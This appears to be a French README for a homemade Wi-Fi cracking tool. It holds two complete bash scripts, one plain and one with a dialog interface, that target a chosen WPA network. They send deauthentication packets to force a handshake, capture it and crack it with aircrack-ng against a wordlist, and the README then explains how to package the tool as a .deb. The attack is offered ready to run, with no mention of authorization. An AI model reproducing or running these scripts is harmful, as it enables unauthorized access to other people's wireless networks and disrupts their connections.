# Script_bash_crack_wifi

## Script simple

```bash
#!/bin/bash
echo "***SAMGLISH CRACK WIFI***"
echo "=== Activation du mode moniteur ==="
sudo airmon-ng check kill
sudo airmon-ng start wlan0

echo ""
echo "=== Scan des réseaux disponibles (Ctrl+C pour stopper) ==="
sleep 2
sudo airodump-ng wlan0mon

echo ""
read -p "Entrez le BSSID de la cible : " bssid
read -p "Entrez le canal (CH) : " channel
read -p "Nom du fichier de capture (sans extension) : " output

echo ""
echo "=== Capture ciblée du handshake ==="
sleep 2
sudo airodump-ng -c $channel --bssid $bssid -w $output wlan0mon &
AIRODUMP_PID=$!

sleep 5
read -p "Appuyez sur Entrée pour envoyer les paquets de désauthentification (Ctrl+C pour annuler)"
sudo aireplay-ng -0 10 -a $bssid wlan0mon

echo ""
read -p "Appuyez sur Entrée pour arrêter la capture"
kill $AIRODUMP_PID

echo ""
read -p "Entrez le chemin vers votre dictionnaire (ex: /usr/share/wordlists/rockyou.txt) : " wordlist

echo ""
echo "=== Lancement du craquage avec Aircrack-ng ==="
sudo aircrack-ng -w $wordlist ${output}-01.cap --bssid $bssid 
echo ""
echo "=== Script terminé. Bonne chance pour le crack ! ==="
```

`Ce qu’il fait :`

* Passe wlan0 en mode moniteur. 
* Lance airodump-ng pour détecter les réseaux.
* Demande le BSSID, canal et nom du fichier de capture.
* Lance la capture ciblée.
* Propose d’envoyer les paquets de désauthentification.
* Puis utilise Aircrack-ng avec le dictionnaire choisi.

## Interface utilisateur en texte (avec dialog)

1. Installation de dialog

```bash
sudo apt install dialog
```

samglish.sh
```bash
#!/bin/bash

dialog --msgbox "***SAMGLISH CRACK WIFI***" 10 50
# Vérification de dialog
if ! command -v dialog &> /dev/null; then
    echo "dialog n'est pas installé. Lance : sudo apt install dialog"
    exit 1
fi

# Étape 1 : tuer les interférences et passer en moniteur
airmon-ng check kill
airmon-ng start wlan0

# Étape 2 : scan initial
xterm -hold -e "airodump-ng wlan0mon" &
sleep 3
dialog --msgbox "Observe les réseaux dans la fenêtre ouverte.\nNote le BSSID et le canal.\nFerme la fenêtre puis clique OK." 12 50

# Étape 3 : récupération des infos utilisateur
bssid=$(dialog --inputbox "Entrez le BSSID de la cible :" 8 50 3>&1 1>&2 2>&3)
channel=$(dialog --inputbox "Entrez le canal (CH) de la cible :" 8 50 3>&1 1>&2 2>&3)
output=$(dialog --inputbox "Nom du fichier de capture (ex: capture1) :" 8 50 3>&1 1>&2 2>&3)

# Étape 4 : capture ciblée dans un terminal
xterm -hold -e "airodump-ng -c $channel --bssid $bssid -w $output wlan0mon" &
sleep 3
dialog --msgbox "La capture est lancée dans une nouvelle fenêtre.\nClique OK pour envoyer les paquets de désauth." 10 50

# Étape 5 : attaque de désauth
xterm -e "aireplay-ng -0 10 -a $bssid wlan0mon"

# Étape 6 : arrêt de la capture
pkill airodump-ng
sleep 1

# Étape 7 : sélection du fichier dictionnaire
wordlist=$(dialog --inputbox "Chemin vers votre dictionnaire (ex: /usr/share/wordlists/rockyou.txt) :" 8 60 3>&1 1>&2 2>&3)

# Étape 8 : craquage
capfile="${output}-01.cap"
dialog --msgbox "Début du craquage. Ceci peut prendre du temps." 7 50
xterm -hold -e "aircrack-ng -w $wordlist $capfile --bssid $bssid"

dialog --msgbox "Fin du script. Vérifie si le mot de passe a été trouvé !" 7 50

```
## Étapes pour créer un .deb : `samglish.deb`

1. Crée l’arborescence du paquet
```bash
mkdir -p DEBIAN
mkdir -p usr/local/bin
```
2. Place ton script dans `/usr/local/bin`
```bash
cp samglish.sh /usr/local/bin/samglish
chmod +x /usr/local/bin/samglish
```
 3. Crée le fichier control
```bash
nano DEBIAN/control
```

Et colle ceci dedans :

```vbnet
Package: samglish-wifi
Version: 1.0
Section: utils
Priority: optional
Architecture: all
Maintainer: Beidi Dina Samuel
Description: Script d’attaque WPA avec interface dialog pour Linux.
Depends: bash, dialog, aircrack-ng, xterm
```

4. Génère le .deb

Mettre tout le contenu dans un dossier (samglish)

```bash
dpkg-deb --build samglish
```

On obtient `samglish.deb`

### Pour installer le paquet :
```bash
sudo dpkg -i samglish.deb
```

Et tu l’exécutes avec :

```bash
sudo samglish
```

ou on lance seulement le script en mode administrateur (sudo)
```bash
bash samglish.sh
```

<hr>

Télécharge le fichier .deb et installe le, pour apprendre plus sur le logiciel, Merci.

<img src="tof1.png" width="100%">
<img src="tof2.png" width="100%">
<img src="tof3.png" width="100%">
